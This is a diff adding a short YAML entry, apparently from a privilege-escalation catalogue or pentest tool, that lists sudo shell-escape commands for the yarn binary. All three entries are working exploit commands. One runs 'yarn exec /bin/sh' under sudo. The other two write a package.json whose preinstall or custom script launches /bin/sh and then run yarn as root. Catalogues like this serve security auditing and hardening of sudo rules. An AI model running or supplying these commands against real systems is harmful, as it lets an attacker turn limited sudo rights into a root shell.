@@ -1,0 +1,8 @@
+name: yarn
+binary_path: /usr/bin/yarn
+exploit_cmds:
+- sudo /usr/bin/yarn exec /bin/sh
+- 'echo ''{"scripts": {"preinstall": "/bin/sh"}}'' >package.json && sudo /usr/bin/yarn
+  --cwd .'
+- 'echo ''{"scripts": {"xxx": "/bin/sh"}}'' >package.json && sudo /usr/bin/yarn --cwd
+  . xxx'
